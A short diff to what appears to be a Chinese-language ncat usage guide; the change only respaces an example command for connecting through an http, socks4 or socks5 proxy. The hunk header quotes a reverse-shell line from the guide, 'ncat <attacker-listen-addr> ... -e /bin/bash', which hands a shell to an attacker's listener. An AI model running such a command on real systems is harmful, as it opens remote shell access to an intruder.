@@ -110,7 +110,7 @@ ncat <attacker-listen-addr> <attcker-listen-port> -e /bin/bash
 
 
 （五）代理
-1 客户端：ncat --proxy <proxyhost>[:<proxyport>] --proxy-type  { http  |   socks4  |   socks5 } <host> [<port>]
+1 客户端：ncat       --proxy       <proxyhost>[:<proxyport>]       --proxy-type       { http  |   socks4  |   socks5 }     <host> [<port>]
 默认proxy-type是http。
 
 2 服务器：
